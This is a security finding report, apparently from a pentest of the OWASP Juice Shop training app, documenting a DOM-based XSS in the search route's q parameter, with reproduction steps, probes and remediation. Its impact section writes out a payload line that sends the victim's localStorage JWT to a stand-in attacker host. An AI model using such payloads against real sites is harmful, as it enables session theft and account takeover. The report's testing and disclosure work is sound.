# DOM-XSS on /#/search?q= — bypassSecurityTrustHtml on query parameter

- **Severity:** medium
- **Date (UTC):** 2026-11-19

## Details

## Summary
The Angular SPA route `/#/search?q=<payload>` reads the `q` query parameter and renders it into the `#searchValue` span via `bypassSecurityTrustHtml`, bypassing the framework's default output encoding. Any HTML/JS the attacker puts in `q` executes in the victim's browser context.

## Steps to reproduce
1. Navigate to `http://localhost:3000/#/search?q=%3Cimg%20src%3Dx%20onerror%3D%22window.__xss_fired%3DDate.now()%22%3E` (URL-encoded `<img src=x onerror="window.__xss_fired=Date.now()">`).
2. Inspect the DOM — `<span id="searchValue">` now contains a live `<img>` child instead of escaped text.
3. Inspect `window.__xss_fired` in the console — populated with a timestamp proving the `onerror` handler executed.

## Evidence
Progressive probes against the same route:

- Marker probe `?q=xssPROBE123` → text reflects verbatim into `<span id="searchValue">` (confirms the sink reads the query string).
- HTML-tag probe `?q=<b>BOLDxss</b>` → rendered DOM: `<span id="searchValue"><b>BOLDxss</b></span>` (confirms the sink is `innerHTML`, not `innerText`).
- JS-execution probe `?q=<img src=x onerror="window.__xss_fired=Date.now()">` → rendered DOM: `<span id="searchValue"><img src="x" onerror="..."></span>`, and `window.__xss_fired = 1795070803321` after render (confirms arbitrary JS execution).

Sink (per Juice Shop v20.3.0 source): `frontend/src/app/search-result/search-result.component.ts` uses `this.sanitizer.bypassSecurityTrustHtml(queryParam)` on the `q` parameter before assigning to the template.

## Impact
Any URL of the form `/#/search?q=<payload>` sent to a victim executes attacker JS in the victim's origin. Juice Shop stores the authentication JWT in `localStorage` with no `HttpOnly` protection (cookies are not the auth transport), so a payload like `fetch('//attacker/'+localStorage.getItem('token'))` steals the active session on click. Chains with the auth-phase findings:
- `2026-11-18-high-password-hash-leaked-in-jwt.md` — a stolen JWT also leaks the user's MD5 password hash.
- `2026-11-18-high-no-jwt-exp-claim.md` — tokens never expire, so a stolen token is permanent.
- `2026-11-19-critical-bfla-api-users-list.md` — a stolen admin JWT yields the full user directory.

Delivery is a one-click link in email/chat/review — no social engineering beyond "click this".

## Remediation
- Remove the `bypassSecurityTrustHtml` call; let Angular's default output encoding escape the value into the span as text.
- If HTML rendering of the query is required (it is not), allowlist a narrow tag set via DOMPurify before passing to `bypassSecurityTrustHtml`.
- Add a `Content-Security-Policy` response header with `script-src 'self'` and no `unsafe-inline`; this blocks the inline `onerror` handler even if the sink is not fixed (defence-in-depth, not a fix).
- Move the JWT out of `localStorage` into a `HttpOnly; Secure; SameSite=Strict` cookie so a successful XSS cannot steal it.

## References
- CWE-79 (Improper Neutralization of Input During Web Page Generation — XSS)
- OWASP Top 10 2021 A03 (Injection)
- OWASP ASVS V5.3.3 (Output encoding)
- Angular Security Guide — "Trusting safe values" (the explicit footgun this app walked into)
- Juice Shop challenge: "DOM XSS"

